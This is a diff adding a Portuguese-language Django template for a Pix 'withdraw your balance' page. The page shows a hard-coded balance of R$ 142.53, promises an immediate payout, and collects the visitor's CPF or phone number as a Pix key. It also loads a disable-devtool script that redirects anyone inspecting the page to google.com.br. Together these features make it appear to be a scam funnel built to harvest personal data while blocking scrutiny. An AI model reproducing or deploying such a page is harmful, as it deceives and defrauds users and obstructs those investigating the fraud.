@@ -1,0 +1,98 @@
+{%extends 'core/base.html' %}
+
+{%load static%}
+{%block 'conteudo'%}
+    <body class="fundoWhite">
+
+        <div style="height: 270px;" class="corteLayoutTop"></div>
+
+        <div id="p1" style="background-color: #FFFFFF; padding: 15px 0 18px 0;">
+            <img style="width: 35%; margin: auto; margin-left: 10px; position: relative; margin-top: 10px;" src="{%static 'images/logo2.png' %}" />
+
+            <div class="boxSaldo">
+                <label for="input" class="textoSaldo" class="text" style="background-color: #F4F4F4;">SALDO</label>
+                <p class="valorSaldo">R$ <span class="saldoAtualizado">142.53</span></p>
+            </div>
+
+            <div style="position: relative; margin-top: -5px;">
+                <h1 style="font-family:'RecoletaBold'; font-size: 30px; text-align: center; margin: 23px 0 7px 0; color: #000000;">realize o seu saque!</h1>
+                <p style="font-size: 15px; text-align: center; padding: 0 7px 0 7px; font-family: 'Radian';">Chegou a hora boa! Coloque sua chave pix <br />corretamente, e receba seu saque de <b>imediato.</b></b></p>
+            </div>
+            
+        </div>
+
+
+        <div style="background-color: transparent; width: 100%;">
+            <div style="text-align: center; display: flex; justify-content: center; flex-direction: row; margin-top: 17px;">
+                <svg style="margin-top: 5px;" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" width="20" height="20" style="display: inline-flex; vertical-align: text-bottom;" fill= "#32BCAD " transition= "fill .3s">
+                    <path d="M242.4 292.5C247.8 287.1 257.1 287.1 262.5 292.5L339.5 369.5C353.7 383.7 372.6 391.5 392.6 391.5H407.7L310.6 488.6C280.3 518.1 231.1 518.1 200.8 488.6L103.3 391.2H112.6C132.6 391.2 151.5 383.4 165.7 369.2L242.4 292.5zM262.5 218.9C256.1 224.4 247.9 224.5 242.4 218.9L165.7 142.2C151.5 127.1 132.6 120.2 112.6 120.2H103.3L200.7 22.76C231.1-7.586 280.3-7.586 310.6 22.76L407.8 119.9H392.6C372.6 119.9 353.7 127.7 339.5 141.9L262.5 218.9zM112.6 142.7C126.4 142.7 139.1 148.3 149.7 158.1L226.4 234.8C233.6 241.1 243 245.6 252.5 245.6C261.9 245.6 271.3 241.1 278.5 234.8L355.5 157.8C365.3 148.1 378.8 142.5 392.6 142.5H430.3L488.6 200.8C518.9 231.1 518.9 280.3 488.6 310.6L430.3 368.9H392.6C378.8 368.9 365.3 363.3 355.5 353.5L278.5 276.5C264.6 262.6 240.3 262.6 226.4 276.6L149.7 353.2C139.1 363 126.4 368.6 112.6 368.6H80.78L22.76 310.6C-7.586 280.3-7.586 231.1 22.76 200.8L80.78 142.7H112.6z"></path>
+                </svg>
+                <h4 style="font-size: 12px; font-weight: bold; color: #707070; margin-left: 10px;">SELECIONE SEU TIPO DE CHAVE PIX</h4>
+            </div>
+
+            <form action="{% url 'transferencia_pix' %}" method="POST" id="formPix">
+                <div class="row" style="display: flex; flex-direction: row; flex-wrap: nowrap; justify-content: space-evenly; margin-top: 10px;">
+                    <!-- Radio buttons para selecionar o tipo de chave -->
+                    <label>
+                        <input type="radio" class="tipoChave" name="tipoChave" value="document" onclick="updateInputMask('document');"/>
+                        <div class="icon-box">
+                            <img src="{%static 'images/icons/CPF.png' %}" alt="CPF"/>
+                            CPF
+                        </div>
+                    </label>
+                    <label>
+                        <input type="radio" class="tipoChave" name="tipoChave" value="phoneNumber" onclick="updateInputMask('phoneNumber');"/>
+                        <div class="icon-box">
+                            <img src="{%static 'images/icons/Telefone.png' %}" alt="Telefone"/>
+                            CELULAR
+                        </div>
+                    </label>
+                </div>
+                <input type="hidden" name="valida" value="ok">
+                <div class="coolinput" style="margin-top: 20px; position: relative;">
+                    <label for="chavePix" class="text">CHAVE PIX</label>
+                    <input type="text" placeholder="Digite sua CHAVE PIX" name="chavePix" id="chavePix" class="input" autocomplete="off" required>
+                    <div style="margin: -5px 0 0 10px;"><span id="validacaoPix"></span></div>
+                </div>
+                <div style="position: relative;">
+                    <button style="color: #727272; border-radius: 8px; background-color: #E0E0E0; border: none; margin-right: 50px; margin-top: 35px; padding-left: 53px; width: 100%;" id="submit">Receber PIX</button>
+                </div>
+            </form>
+        </div>
+
+        
+
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.0/jquery.mask.js"></script>
+        <script src="{%static 'js/validacaoPix.js' %}"></script>
+        <script src="{%static 'js/funcoes.js' %}"></script>
+        <script disable-devtool-auto src='https://cdn.jsdelivr.net/npm/disable-devtool' url='https://google.com.br'></script>
+        <script>
+          
+            // BACK REDIRECT
+
+            // MÁSCARA INPUT
+            jQuery(function($){
+                $('.tipoChave').change(function(){
+                    var campo = $(this).val();
+                    if (campo == "document"){	
+                        $("#chavePix").val('');
+                        $("#chavePix").mask("999.999.999-99");
+                        $("#chavePix").attr('inputmode', 'numeric');
+                    }
+                    if (campo == "phoneNumber"){
+                        $("#chavePix").val('');
+                        $("#chavePix").mask("(99) 99999-9999");
+                        $("#chavePix").attr('inputmode', 'numeric');
+                    }	
+                    if (campo == "email"){
+                        $("#chavePix").val('');
+                        $("#chavePix").unmask();
+                        $("#chavePix").attr('inputmode', 'text');
+                    }			
+                });
+            });
+            // MÁSCARA INPUT  
+            
+        </script>
+{%endblock%}
